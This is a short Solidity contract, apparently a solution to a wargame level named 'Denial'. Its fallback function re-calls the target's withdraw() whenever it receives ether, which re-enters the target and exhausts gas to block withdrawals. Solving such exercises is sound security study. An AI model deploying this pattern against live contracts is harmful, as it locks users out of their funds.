// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Denial.sol";

contract DenialHelper {
    Denial denialInst;

    constructor(address payable denialAddr) public {
        denialInst = Denial(denialAddr);
    }

    fallback() external payable {
        denialInst.withdraw();
    }
}